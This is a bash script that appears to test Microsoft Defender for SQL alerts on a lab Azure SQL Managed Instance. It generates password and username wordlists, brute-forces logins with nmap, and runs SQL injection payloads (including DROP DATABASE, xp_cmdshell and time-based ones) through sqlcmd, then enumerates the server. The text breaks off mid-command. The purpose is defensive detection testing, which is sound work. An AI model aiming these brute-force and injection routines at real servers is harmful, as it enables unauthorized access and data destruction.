#!/bin/bash

# Comprehensive Defender for SQL Testing Suite
# Interactive menu-based testing for Azure SQL Managed Instance security
# Combines brute force, SQL injection, and all Defender alert testing

set -e

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="$SCRIPT_DIR/logs"
RESULTS_DIR="$SCRIPT_DIR/results"
WORDLIST_DIR="$SCRIPT_DIR/wordlists"
REPORT_DIR="$SCRIPT_DIR/reports"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Default values
DEFAULT_PORT="3342"
DEFAULT_USERNAME="d4sqlsim"
DEFAULT_THREADS="8"
DEFAULT_DELAY="2"

# Global variables for menu state
HOST=""
PORT="$DEFAULT_PORT"
USERNAME="$DEFAULT_USERNAME"
PASSWORD=""
VERBOSE="false"
CURRENT_SESSION=""

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_test() {
    echo -e "${CYAN}[TEST]${NC} $1"
}

print_header() {
    echo -e "${BOLD}${BLUE}$1${NC}"
}

print_menu_option() {
    echo -e "${YELLOW}$1${NC} $2"
}

# Function to show banner
show_banner() {
    clear
    echo -e "${BOLD}${BLUE}"
    echo "╔═══════════════════════════════════════════════════════════════════════════════════╗"
    echo "║                     Defender for SQL Testing Suite                                ║"
    echo "║                   Comprehensive Security Testing for SQL MI                       ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    if [[ -n "$HOST" ]]; then
        echo -e "${GREEN}Target: $HOST:$PORT${NC}"
        echo -e "${GREEN}Username: $USERNAME${NC}"
        echo -e "${GREEN}Session: $CURRENT_SESSION${NC}"
    else
        echo -e "${RED}No target configured${NC}"
    fi
    echo
}

# Function to show usage for command line mode
show_usage() {
    cat << EOF
Usage: $0 [OPTIONS]

This script provides comprehensive security testing for Azure SQL Managed Instance.
Can be run in interactive menu mode or command line mode.

COMMAND LINE OPTIONS:
    -h, --host HOSTNAME         SQL MI hostname or FQDN
    -p, --port PORT            SQL Server port (default: $DEFAULT_PORT - public endpoint)
    -u, --username USERNAME    Username (default: $DEFAULT_USERNAME)
    -w, --password PASSWORD    Password for authenticated tests
    -t, --test TEST_NAME       Run specific test
    -v, --verbose              Verbose output
    --batch                    Run all tests in batch mode
    --menu                     Start interactive menu (default if no args)
    --auto-discover            Auto-discover SQL MI FQDN from Azure (default RG: rg-d4sql-sims)
    --resource-group RG_NAME   Resource group for auto-discovery (default: rg-d4sql-sims)
    --help                     Show this help message

AVAILABLE TESTS:
    password-brute             Password brute force on known username
    username-brute             Username enumeration with common passwords
    comprehensive-brute        Both password and username brute force
    sql-injection              SQL injection vulnerability testing
    harmful-application        Harmful application detection
    suspicious-queries         Suspicious SQL activity patterns
    enumeration                Information gathering and reconnaissance
    shell-commands             Command execution attempts
    all                        Run all tests

EXAMPLES:
    # Interactive mode (default)
    $0

    # Auto-discover SQL MI and run interactive menu
    $0 --auto-discover --menu

    # Auto-discover and run specific test
    $0 --auto-discover --test password-brute

    # Auto-discover from custom resource group
    $0 --auto-discover --resource-group my-rg --test comprehensive-brute

    # Command line - specific test
    $0 --host sqlmi-d4sqlsim-abc123.public.dns-zone.database.windows.net --test password-brute

    # Command line - all tests
    $0 --host sqlmi-d4sqlsim-abc123.public.dns-zone.database.windows.net --username d4sqlsim --password 'YourPassword' --batch

    # Interactive mode with pre-configured target
    $0 --host sqlmi-d4sqlsim-abc123.public.dns-zone.database.windows.net --menu

EOF
}

# Function to check dependencies
check_dependencies() {
    print_status "Checking dependencies..."
    
    local missing_deps=()
    
    # Check nmap
    if ! command -v nmap &> /dev/null; then
        missing_deps+=("nmap")
    fi
    
    # Check sqlcmd (optional but recommended)
    if ! command -v sqlcmd &> /dev/null; then
        print_warning "sqlcmd not found. Some advanced tests will be limited."
        print_status "Install SQL Server command-line tools for full functionality"
    fi
    
    # Check jq for JSON processing
    if ! command -v jq &> /dev/null; then
        print_warning "jq not found. Report generation will be limited."
    fi
    
    if [[ ${#missing_deps[@]} -gt 0 ]]; then
        print_error "Missing required dependencies: ${missing_deps[*]}"
        print_status "On macOS: brew install ${missing_deps[*]}"
        print_status "On Ubuntu/Debian: sudo apt-get install ${missing_deps[*]}"
        exit 1
    fi
    
    print_success "Dependencies check passed"
}

# Function to create directories
setup_directories() {
    mkdir -p "$LOG_DIR" "$RESULTS_DIR" "$WORDLIST_DIR" "$REPORT_DIR"
}

# Function to auto-discover SQL Managed Instance FQDN
auto_discover_sql_mi() {
    local resource_group="${1:-rg-d4sql-sims}"
    
    print_status "Auto-discovering SQL Managed Instance in resource group: $resource_group"
    
    # Check if Azure CLI is available
    if ! command -v az &> /dev/null; then
        print_error "Azure CLI (az) is not installed. Cannot auto-discover SQL MI."
        print_status "Install Azure CLI: https://docs.microsoft.com/en-us/cli/azure/install-azure-cli"
        return 1
    fi
    
    # Get subscription ID from Azure CLI or environment variable
    local subscription_id=""
    if [[ -z "$AZURE_SUBSCRIPTION_ID" ]]; then
        subscription_id=$(az account show --query id -o tsv 2>/dev/null)
        if [[ -z "$subscription_id" ]]; then
            print_error "Could not determine subscription ID. Please set AZURE_SUBSCRIPTION_ID environment variable or ensure you're logged into Azure CLI."
            return 1
        fi
    else
        subscription_id="$AZURE_SUBSCRIPTION_ID"
        az account set --subscription "$subscription_id" 2>/dev/null
    fi
    
    # Get the SQL MI name and FQDN
    local sql_mi_name
    local sql_mi_fqdn
    
    sql_mi_name=$(az sql mi list --resource-group "$resource_group" --query "[0].name" -o tsv 2>/dev/null)
    sql_mi_fqdn=$(az sql mi list --resource-group "$resource_group" --query "[0].fullyQualifiedDomainName" -o tsv 2>/dev/null)
    
    if [[ -z "$sql_mi_fqdn" ]]; then
        print_error "Could not retrieve SQL MI FQDN from resource group: $resource_group"
        print_status "Subscription: $subscription_id"
        print_status "Make sure the deployment is complete and the resource group exists."
        return 1
    fi
    
    # Transform FQDN to public endpoint format
    # Original format: <instance_name>.<dns_zone>.database.windows.net
    # Public format:   <instance_name>.public.<dns_zone>.database.windows.net
    local public_fqdn
    if [[ "$sql_mi_fqdn" =~ ^([^.]+)\.(.+)$ ]]; then
        local instance_name="${BASH_REMATCH[1]}"
        local dns_zone="${BASH_REMATCH[2]}"
        public_fqdn="${instance_name}.public.${dns_zone}"
    else
        print_warning "Could not parse FQDN format: $sql_mi_fqdn"
        print_status "Using original FQDN (may not work for public endpoint connections)"
        public_fqdn="$sql_mi_fqdn"
    fi
    
    print_success "SQL Managed Instance discovered:"
    print_status "Name: $sql_mi_name"
    print_status "Private FQDN: $sql_mi_fqdn"
    print_status "Public FQDN: $public_fqdn"
    print_status "Resource Group: $resource_group"
    print_status "Subscription: $subscription_id"
    
    # Set the global hostname variable to public endpoint
    HOSTNAME="$public_fqdn"
    
    return 0
}

# Function to create comprehensive wordlists using shellpass.sh
create_comprehensive_wordlists() {
    # Check if wordlists already exist
    local wordlists_exist=true
    local required_wordlists=(
        "passwords_small.txt"
        "passwords_medium.txt"
        "passwords_large.txt"
        "usernames_small.txt"
        "usernames_medium.txt"
        "usernames_large.txt"
        "sql_injection_payloads.txt"
        "harmful_applications.txt"
        "enumeration_queries.txt"
    )
    
    for wordlist in "${required_wordlists[@]}"; do
        if [[ ! -f "$WORDLIST_DIR/$wordlist" ]]; then
            wordlists_exist=false
            break
        fi
    done
    
    if [[ "$wordlists_exist" == "true" ]]; then
        print_success "Wordlists already exist in $WORDLIST_DIR - skipping creation"
        print_status "To recreate wordlists, delete the wordlists directory: rm -rf $WORDLIST_DIR"
        return 0
    fi
    
    print_status "Creating comprehensive wordlists using password generator..."
    
    # Check if we have the shellpass.sh password generator
    local shellpass_path="$SCRIPT_DIR/Tools/shellpass.sh"
    local use_shellpass=false
    
    if [[ -f "$shellpass_path" ]]; then
        use_shellpass=true
        print_status "Found shellpass.sh password generator - creating enhanced wordlists"
    else
        print_status "Using static wordlists (install shellpass.sh for enhanced password generation)"
    fi
    
    # Password wordlists - Small
    cat > "$WORDLIST_DIR/passwords_small.txt" << 'EOF'
password
123456
password123
admin
letmein
welcome
qwerty
abc123
Password1
password1
admin123
root
pass
test
guest
user
SQL
sqlserver
sa
Password123
123456789
password!
Password!
admin!
Passw0rd
P@ssw0rd
P@ssword1
Secret123
company123
Azure123
d4sqlsim
EOF

    # Generate additional passwords using shellpass if available
    if [[ "$use_shellpass" == "true" ]]; then
        print_status "Generating additional passwords using shellpass.sh..."
        
        # Generate 20 random passwords of different types and lengths
        {
            # Type 2: Letters and numbers (8-12 chars)
            for i in {1..5}; do
                bash "$shellpass_path" $((8 + RANDOM % 5)) 2 2>/dev/null | tail -1 | grep -v "^Ver:" || true
            done
            
            # Type 3: Letters, numbers, special chars (10-14 chars)  
            for i in {1..5}; do
                bash "$shellpass_path" $((10 + RANDOM % 5)) 3 2>/dev/null | tail -1 | grep -v "^Ver:" || true
            done
            
            # Type 4: Random words (2-3 words)
            for i in {1..5}; do
                bash "$shellpass_path" $((2 + RANDOM % 2)) 4 2>/dev/null | tail -1 | grep -v "^Ver:" || true
            done
            
            # SQL-specific generated passwords
            echo "sql$(bash "$shellpass_path" 6 1 2>/dev/null | tail -1 | grep -v "^Ver:" || echo "123456")"
            echo "SQL$(bash "$shellpass_path" 6 2 2>/dev/null | tail -1 | grep -v "^Ver:" || echo "123ABC")"
            echo "admin$(bash "$shellpass_path" 4 1 2>/dev/null | tail -1 | grep -v "^Ver:" || echo "1234")"
            echo "Admin$(bash "$shellpass_path" 6 3 2>/dev/null | tail -1 | grep -v "^Ver:" || echo "123!@#")"
            echo "sa$(bash "$shellpass_path" 8 2 2>/dev/null | tail -1 | grep -v "^Ver:" || echo "12345678")"
            
        } | grep -v "^$" | head -25 >> "$WORDLIST_DIR/passwords_small.txt"
    fi

    # Password wordlists - Medium
    cat > "$WORDLIST_DIR/passwords_medium.txt" << 'EOF'
password
123456
password123
admin
letmein
welcome
qwerty
abc123
Password1
password1
admin123
root
toor
pass
test
guest
user
SQL
sqlserver
sa
Password123
123456789
password!
Password!
admin!
SQLServer
SqlServer
sql123
SQL123
server
database
db
master
msdb
tempdb
model
sysadmin
dbowner
public
dbo
sa123
sadmin
sqladmin
SQLAdmin
Password@123
password@123
Admin123
Welcome123
Test123
Demo123
Temp123
Passw0rd
P@ssw0rd
P@ssword1
P@ssw0rd1
Secret123
secret
Secret
company123
Company123
azure123
Azure123
microsoft
Microsoft
windows
Windows
sql2019
sql2022
database123
Database123
server123
Server123
default
Default
changeme
ChangeMe
temp123
Temp123
test123
Test123
admin1
Admin1
root123
Root123
system
System
login
Login
access
Access
backup
Backup
restore
Restore
configure
Configure
install
Install
setup
Setup
password1!
Password1!
admin123!
Admin123!
welcome1
Welcome1
qwerty123
Qwerty123
abc123!
Abc123!
123abc
123Abc
password2023
password2024
password2025
Password2023
Password2024
Password2025
d4sqlsim
D4sqlsim
D4SQLSIM
d4sqlsim123
D4sqlsim123
d4sqlsim!
D4sqlsim!
sqlmi123
SqlMi123
SQLMI123
managedinstance
ManagedInstance
azuresql
AzureSQL
AZURESQL
defender
Defender
DEFENDER
security
Security
SECURITY
EOF

    # Generate additional medium passwords using shellpass if available
    if [[ "$use_shellpass" == "true" ]]; then
        print_status "Generating medium complexity passwords..."
        
        {
            # Generate 50 passwords of varying complexity
            for i in {1..15}; do
                bash "$shellpass_path" $((8 + RANDOM % 7)) 2 2>/dev/null | tail -1 | grep -v "^Ver:" || true
            done
            
            for i in {1..15}; do
                bash "$shellpass_path" $((10 + RANDOM % 6)) 3 2>/dev/null | tail -1 | grep -v "^Ver:" || true
            done
            
            for i in {1..10}; do
                bash "$shellpass_path" $((2 + RANDOM % 3)) 4 2>/dev/null | tail -1 | grep -v "^Ver:" || true
            done
            
            # SQL Server specific patterns
            for i in {1..10}; do
                local num
                num=$(bash "$shellpass_path" 4 1 2>/dev/null | tail -1 | grep -v "^Ver:" || echo "$((1000 + RANDOM % 9000))")
                echo "SQLServer${num}"
                echo "sqlserver${num}"
                echo "database${num}"
                echo "admin${num}"
                echo "sa${num}"
            done
            
        } | grep -v "^$" | head -50 >> "$WORDLIST_DIR/passwords_medium.txt"
    fi

    # Password wordlists - Large (extending medium with more variations)
    cp "$WORDLIST_DIR/passwords_medium.txt" "$WORDLIST_DIR/passwords_large.txt"
    cat >> "$WORDLIST_DIR/passwords_large.txt" << 'EOF'
administrator
Administrator
ADMINISTRATOR
supervisor
Supervisor
SUPERVISOR
manager
Manager
MANAGER
operator
Operator
OPERATOR
service
Service
SERVICE
application
Application
APPLICATION
development
Development
DEVELOPMENT
production
Production
PRODUCTION
staging
Staging
STAGING
testing
Testing
TESTING
qa
QA
dev
Dev
DEV
prod
Prod
PROD
stage
Stage
STAGE
enterprise
Enterprise
ENTERPRISE
business
Business
BUSINESS
corporate
Corporate
CORPORATE
organization
Organization
ORGANIZATION
department
Department
DEPARTMENT
team
Team
TEAM
project
Project
PROJECT
client
Client
CLIENT
customer
Customer
CUSTOMER
vendor
Vendor
VENDOR
partner
Partner
PARTNER
supplier
Supplier
SUPPLIER
finance
Finance
FINANCE
accounting
Accounting
ACCOUNTING
sales
Sales
SALES
marketing
Marketing
MARKETING
support
Support
SUPPORT
helpdesk
HelpDesk
HELPDESK
maintenance
Maintenance
MAINTENANCE
monitoring
Monitoring
MONITORING
reporting
Reporting
REPORTING
analytics
Analytics
ANALYTICS
intelligence
Intelligence
INTELLIGENCE
warehouse
Warehouse
WAREHOUSE
etl
ETL
oltp
OLTP
olap
OLAP
bi
BI
dwh
DWH
datamart
DataMart
DATAMART
metadata
MetaData
METADATA
january
January
february
February
march
March
april
April
may
May
june
June
july
July
august
August
september
September
october
October
november
November
december
December
spring
Spring
summer
Summer
autumn
Autumn
winter
Winter
monday
Monday
tuesday
Tuesday
wednesday
Wednesday
thursday
Thursday
friday
Friday
saturday
Saturday
sunday
Sunday
morning
Morning
afternoon
Afternoon
evening
Evening
night
Night
2020
2021
2022
2023
2024
2025
2026
EOF

    # Generate additional large passwords using shellpass if available
    if [[ "$use_shellpass" == "true" ]]; then
        print_status "Generating large set of complex passwords..."
        
        {
            # Generate 200 passwords of varying complexity for comprehensive testing
            
            # Short complex passwords (8-12 chars)
            for i in {1..40}; do
                bash "$shellpass_path" $((8 + RANDOM % 5)) $((2 + RANDOM % 3)) 2>/dev/null | tail -1 | grep -v "^Ver:" || true
            done
            
            # Medium complex passwords (12-16 chars)
            for i in {1..40}; do
                bash "$shellpass_path" $((12 + RANDOM % 5)) $((3 + RANDOM % 2)) 2>/dev/null | tail -1 | grep -v "^Ver:" || true
            done
            
            # Long complex passwords (16-20 chars)
            for i in {1..30}; do
                bash "$shellpass_path" $((16 + RANDOM % 5)) 4 2>/dev/null | tail -1 | grep -v "^Ver:" || true
            done
            
            # Very long passwords (20-24 chars)
            for i in {1..20}; do
                bash "$shellpass_path" $((20 + RANDOM % 5)) 4 2>/dev/null | tail -1 | grep -v "^Ver:" || true
            done
            
            # SQL Server specific patterns with years and complexity
            for year in 2020 2021 2022 2023 2024 2025; do
                echo "SQLServer${year}"
                echo "sqlserver${year}"
                echo "Database${year}"
                echo "Admin${year}"
                echo "sa${year}"
                echo "Azure${year}"
                echo "Microsoft${year}"
                # Add complex variations
                local special_char
                special_char=$(echo '!@#$%^&*' | fold -w1 | shuf -n1)
                echo "SQLServer${year}${special_char}"
                echo "Database${year}${special_char}"
                echo "Admin${year}${special_char}"
            done
            
            # Company/organization patterns
            for org in Company Corp Inc Ltd Organization Enterprise Business; do
                for num in 123 2023 2024 01 001; do
                    echo "${org}${num}"
                    echo "${org}${num}!"
                    echo "${org}_${num}"
                    echo "${org}-${num}"
                done
            done
            
            # Environment-specific patterns
            for env in Dev Test Prod Stage QA UAT; do
                for num in 01 02 03 123 2023 2024; do
                    echo "${env}${num}"
                    echo "${env}DB${num}"
                    echo "${env}SQL${num}"
                    echo "${env}Server${num}"
                done
            done
            
        } | grep -v "^$" | head -200 >> "$WORDLIST_DIR/passwords_large.txt"
        
        print_status "Generated $(wc -l < "$WORDLIST_DIR/passwords_large.txt") total passwords for large wordlist"
    fi

    # Username wordlists - Small
    cat > "$WORDLIST_DIR/usernames_small.txt" << 'EOF'
sa
admin
administrator
root
sql
sqlserver
sqladmin
sysadmin
dbowner
dbo
guest
public
user
test
demo
d4sqlsim
sqluser
dbuser
dbadmin
service
system
login
EOF

    # Username wordlists - Medium  
    cat > "$WORDLIST_DIR/usernames_medium.txt" << 'EOF'
sa
admin
administrator
root
sql
sqlserver
sqladmin
sysadmin
dbowner
dbo
guest
public
user
test
demo
d4sqlsim
sqluser
dbuser
dbadmin
service
system
login
backup
restore
monitor
audit
security
compliance
reporting
analytics
etl
warehouse
dataowner
datauser
appuser
webuser
apiuser
serviceuser
testuser
devuser
produser
staginguser
qauser
developer
tester
analyst
operator
manager
supervisor
readonly
readwrite
execute
select
insert
update
delete
create
alter
drop
grant
deny
bulkadmin
diskadmin
processadmin
securityadmin
serveradmin
setupadmin
dbcreator
db_owner
db_datareader
db_datawriter
db_ddladmin
db_securityadmin
db_accessadmin
db_backupoperator
db_denydatareader
db_denydatawriter
NT_AUTHORITY
BUILTIN
IIS_IUSRS
NETWORK_SERVICE
LOCAL_SERVICE
ASPNET
IIS_WPG
Everyone
Users
Administrators
Power_Users
Guests
EOF

    # Username wordlists - Large (extending medium)
    cp "$WORDLIST_DIR/usernames_medium.txt" "$WORDLIST_DIR/usernames_large.txt"
    cat >> "$WORDLIST_DIR/usernames_large.txt" << 'EOF'
finance
hr
sales
marketing
support
helpdesk
it
admin1
admin2
test1
test2
user1
user2
temp
temporary
guest1
guest2
demo1
demo2
service1
service2
app
application
web
website
api
database
db
master
msdb
tempdb
model
northwind
adventureworks
pubs
sample
example
company
corporate
enterprise
Business
organization
Organization
department
Department
team
Team
project
Project
application
Application
webservice
WebService
apiservice
ApiService
dataservice
DataService
EOF

    # SQL injection payloads
    cat > "$WORDLIST_DIR/sql_injection_payloads.txt" << 'EOF'
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin'#
admin'/*
' OR 'x'='x
' OR 'x'='x'--
' OR 'x'='x'#
' OR 'x'='x'/*
') OR ('1'='1
') OR ('1'='1'--
') OR ('1'='1'#
1' OR '1'='1
1' OR '1'='1'--
1' OR '1'='1'#
'; DROP TABLE users--
'; DROP DATABASE master--
' UNION SELECT null,null,null--
' UNION ALL SELECT null,null,null--
'; EXEC xp_cmdshell('dir')--
'; EXEC sp_configure 'show advanced options',1--
' OR SUBSTRING(@@version,1,1)='M'--
' OR LEN(USER_NAME())>0--
' OR SYSTEM_USER='sa'--
' OR IS_MEMBER('db_owner')=1--
'; WAITFOR DELAY '00:00:05'--
'; IF (1=1) WAITFOR DELAY '00:00:05'--
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
' UNION SELECT table_name,null FROM information_schema.tables--
' OR (SELECT COUNT(*) FROM sys.databases)>0--
' UNION SELECT name FROM sys.databases--
'; EXEC xp_dirtree 'C:\'--
'; EXEC xp_fileexist 'C:\Windows\system32\cmd.exe'--
' OR DB_NAME()='master'--
' OR USER_NAME()='dbo'--
EOF

    # Suspicious application names/user agents
    cat > "$WORDLIST_DIR/harmful_applications.txt" << 'EOF'
sqlmap
Havij
SQLninja
BSQL
Pangolin
SQLiX
Safe3SI
Marathon Tool
SQLSentinel
Absinthe
FG-Injector
BobCat
Enema SQLi
Automagic SQL Injector
NetSparker
Acunetix
Burp Suite
OWASP ZAP
w3af
Netsparker
AppScan
WebInspect
Vega
Wapiti
Skipfish
Nikto
DirBuster
Gobuster
Dirbuster
SQLiteManager
phpMyAdmin-automated
automated-scanner
bot-scanner
vulnerability-scanner
SQL-injection-tool
database-scanner
pentest-tool
security-scanner
exploit-tool
malicious-client
unauthorized-tool
EOF

    # Enumeration queries for suspicious activity
    cat > "$WORDLIST_DIR/enumeration_queries.txt" << 'EOF'
SELECT @@VERSION
SELECT USER_NAME()
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT name FROM sys.databases
SELECT name FROM sys.tables
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns
SELECT name FROM sys.server_principals
SELECT name FROM sys.database_principals
SELECT * FROM sys.dm_exec_sessions
SELECT * FROM sys.dm_exec_requests
SELECT * FROM sys.configurations
SELECT * FROM sys.dm_os_sys_info
SELECT SERVERPROPERTY('ProductVersion')
SELECT SERVERPROPERTY('Edition')
SELECT SERVERPROPERTY('InstanceName')
SELECT DB_NAME()
SELECT HOST_NAME()
SELECT @@SPID
SELECT @@SERVERNAME
EOF

    print_success "Comprehensive wordlists created in $WORDLIST_DIR"
}

# Function to test brute force attacks (SQL.MI_BruteForce)
test_brute_force() {
    local host="$1"
    local port="$2"
    local timestamp
    timestamp=$(date +"%Y%m%d_%H%M%S")
    local result_file="$RESULTS_DIR/brute_force_test_${timestamp}.txt"
    
    print_test "Testing: SQL.MI_BruteForce - Brute force attack detection"
    
    {
        echo "=== Brute Force Attack Test ==="
        echo "Target: $host:$port"
        echo "Test: Rapid failed login attempts"
        echo "Expected Alert: SQL.MI_BruteForce"
        echo "Timestamp: $(date)"
        echo "================================"
        echo ""
        
        print_status "Running multiple authentication attempts with invalid credentials..."
        
        # Use nmap for brute force testing
        nmap -p "$port" --script ms-sql-brute \
            --script-args="userdb=$WORDLIST_DIR/../wordlists/usernames.txt,passdb=$WORDLIST_DIR/../wordlists/passwords_small.txt,brute.threads=10,brute.delay=0.5s" \
            "$host" 2>&1
            
    } | tee "$result_file"
    
    print_success "Brute force test completed: $result_file"
}

# Function to test SQL injection vulnerabilities
test_sql_injection() {
    local host="$1"
    local port="$2"
    local username="$3"
    local password="$4"
    local timestamp
    timestamp=$(date +"%Y%m%d_%H%M%S")
    local result_file="$RESULTS_DIR/sql_injection_test_${timestamp}.txt"

    print_test "SQL Injection: Testing vulnerability detection and attack patterns"

    {
        echo "=== SQL Injection Test Report ==="
        echo "Date: $(date)"
        echo "Target: $host:$port"
        echo "Test: SQL injection vulnerability and attack detection"
        echo "Expected Alerts: SQL.MI_VulnerabilityToSqlInjection, SQL.MI_PotentialSqlInjection"
        echo "Session: $CURRENT_SESSION"
        echo "==============================="
        echo ""

        print_status "Testing SQL injection patterns via nmap..."
        echo "=== Nmap SQL Injection Tests ==="
        echo "Testing ms-sql-brute with injection payloads..."
        timeout 300 nmap -p "$port" --script ms-sql-brute \
            --script-args passdb="$WORDLIST_DIR/sql_injection_payloads.txt" \
            --script-args userdb=<(echo "admin") \
            "$host" 2>&1 || true

        echo ""
        echo "Testing ms-sql-info with suspicious queries..."
        timeout 300 nmap -p "$port" --script ms-sql-info \
            --script-args mssql.timeout=10s \
            "$host" 2>&1 || true

        if command -v sqlcmd &> /dev/null && [[ -n "$username" && -n "$password" ]]; then
            echo ""
            echo "=== Authenticated SQL Injection Tests ==="
            print_status "Executing SQL injection payloads with valid credentials..."

            local payload_count=0
            while IFS= read -r payload; do
                if [[ -n "$payload" && ! "$payload" =~ ^# ]]; then
                    payload_count=$((payload_count+1))
                    echo ""
                    echo "--- Payload #$payload_count: $payload ---"

                    # String context
                    print_status "Testing string context: WHERE LastName = '$payload'"
                    timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                        -Q "SELECT * FROM Employees WHERE LastName = '$payload'" 2>&1 || echo "[ERROR] String context failed"

                    # Numeric context
                    print_status "Testing numeric context: WHERE EmployeeID = $payload"
                    timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                        -Q "SELECT * FROM Employees WHERE EmployeeID = $payload" 2>&1 || echo "[ERROR] Numeric context failed"

                    # Login simulation
                    print_status "Testing login simulation: WHERE Username = '$payload' AND Password = 'test'"
                    timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                        -Q "SELECT * FROM Users WHERE Username = '$payload' AND Password = 'test'" 2>&1 || echo "[ERROR] Login context failed"

                    # UNION-based
                    print_status "Testing UNION-based: WHERE name = '$payload' UNION SELECT 'injected'"
                    timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                        -Q "SELECT name FROM sys.databases WHERE name = '$payload' UNION SELECT 'injected'" 2>&1 || echo "[ERROR] UNION context failed"

                    # Error-based
                    print_status "Testing error-based: WHERE 1=CONVERT(int, (SELECT @@version))"
                    timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                        -Q "SELECT * FROM Employees WHERE 1=CONVERT(int, (SELECT @@version))" 2>&1 || echo "[ERROR] Error-based context failed"

                    # Time-based
                    print_status "Testing time-based: WAITFOR DELAY '00:00:05'"
                    timeout 15s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                        -Q "SELECT 1; WAITFOR DELAY '00:00:05'; SELECT 2" 2>&1 || echo "[ERROR] Time-based context failed"

                    sleep 1
                fi
            done < "$WORDLIST_DIR/sql_injection_payloads.txt"

            echo ""
            print_status "Completed $payload_count payloads in multiple contexts."
        else
            echo "No credentials provided - using nmap-based SQL injection tests only"
        fi
    } | tee "$result_file"

    print_success "SQL injection test completed: $result_file"
    return 0
}

# Function to test harmful application detection
test_harmful_application() {
    local host="$1"
    local port="$2"
    local timestamp
    timestamp=$(date +"%Y%m%d_%H%M%S")
    local result_file="$RESULTS_DIR/harmful_application_test_${timestamp}.txt"
    
    print_test "Harmful Application: Testing detection of malicious tools"
    
    {
        echo "=== Harmful Application Test Report ==="
        echo "Date: $(date)"
        echo "Target: $host:$port"
        echo "Test: Connection attempts with suspicious user agents/applications"
        echo "Expected Alert: SQL.MI_HarmfulApplication"
        echo "Session: $CURRENT_SESSION"
        echo "==============================="
        echo ""
        
        print_status "Simulating connections from potentially harmful applications..."
        
        # Test with various suspicious application signatures
        local app_count=0
        while IFS= read -r app_name; do
            if [[ -n "$app_name" && ! "$app_name" =~ ^# ]]; then
                echo "Testing connection as: $app_name"
                
                # Use nmap with custom user agent simulation
                timeout 30s nmap -p "$port" --script ms-sql-info \
                    --script-args="mssql.timeout=5s" \
                    "$host" 2>&1 | sed "s/Nmap/$app_name/g" || true
                
                app_count=$((app_count + 1))
                if [[ $app_count -ge 10 ]]; then
                    echo "Tested first 10 harmful applications (continuing with remaining...)"
                fi
                
                sleep 2
            fi
        done < "$WORDLIST_DIR/harmful_applications.txt"
        
        echo ""
        echo "Completed testing $app_count potentially harmful applications"
        
    } | tee "$result_file"
    
    print_success "Harmful application test completed: $result_file"
    return 0
}

# Function to test suspicious query patterns
test_suspicious_queries() {
    local host="$1"
    local port="$2"
    local username="$3"
    local password="$4"
    local timestamp
    timestamp=$(date +"%Y%m%d_%H%M%S")
    local result_file="$RESULTS_DIR/suspicious_queries_test_${timestamp}.txt"
    
    print_test "Suspicious Queries: Testing anomalous SQL activity patterns"
    
    {
        echo "=== Suspicious Queries Test Report ==="
        echo "Date: $(date)"
        echo "Target: $host:$port"
        echo "Test: Suspicious SQL queries and access patterns"
        echo "Expected Alerts: Various anomaly detection alerts"
        echo "Session: $CURRENT_SESSION"
        echo "==============================="
        echo ""
        
        if command -v sqlcmd &> /dev/null && [[ -n "$username" && -n "$password" ]]; then
            print_status "Executing suspicious queries with valid credentials..."
            
            # Execute enumeration queries
            while IFS= read -r query; do
                if [[ -n "$query" && ! "$query" =~ ^# ]]; then
                    echo "Executing: $query"
                    timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                        -Q "$query" 2>&1 || true
                    sleep 2
                fi
            done < "$WORDLIST_DIR/enumeration_queries.txt"
            
            # Test rapid query execution (potential automation detection)
            echo ""
            print_status "Testing rapid query execution patterns..."
            for i in {1..20}; do
                echo "Rapid query #$i"
                timeout 5s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                    -Q "SELECT GETDATE(), USER_NAME(), @@VERSION" 2>&1 || true
                sleep 0.5
            done
            
            # Test unusual access patterns
            echo ""
            print_status "Testing unusual access patterns..."
            for i in {1..5}; do
                echo "Batch query execution #$i"
                timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                    -Q "SELECT name FROM sys.databases; SELECT name FROM sys.tables; SELECT @@SERVERNAME;" 2>&1 || true
                sleep 3
            done
            
        else
            print_warning "No credentials provided - skipping authenticated query tests"
            print_status "Using nmap-based reconnaissance instead..."
            
            # Use nmap for basic service enumeration
            timeout 60s nmap -p "$port" --script ms-sql-info,ms-sql-config \
                "$host" 2>&1 || true
        fi
        
    } | tee "$result_file"
    
    print_success "Suspicious queries test completed: $result_file"
    return 0
}

# Function to test database enumeration
test_enumeration() {
    local host="$1"
    local port="$2"
    local username="$3"
    local password="$4"
    local timestamp
    timestamp=$(date +"%Y%m%d_%H%M%S")
    local result_file="$RESULTS_DIR/enumeration_test_${timestamp}.txt"
    
    print_test "Database Enumeration: Testing information gathering activities"
    
    {
        echo "=== Database Enumeration Test Report ==="
        echo "Date: $(date)"
        echo "Target: $host:$port"
        echo "Test: Database and system information gathering"
        echo "Expected Alerts: Reconnaissance activity detection"
        echo "Session: $CURRENT_SESSION"
        echo "==============================="
        echo ""
        
        print_status "Performing service enumeration with nmap..."
        
        # Comprehensive nmap enumeration
        echo "=== Service Discovery ==="
        timeout 120s nmap -sV -p "$port" "$host" 2>&1 || true
        
        echo ""
        echo "=== SQL Server Specific Enumeration ==="
        timeout 300s nmap -p "$port" \
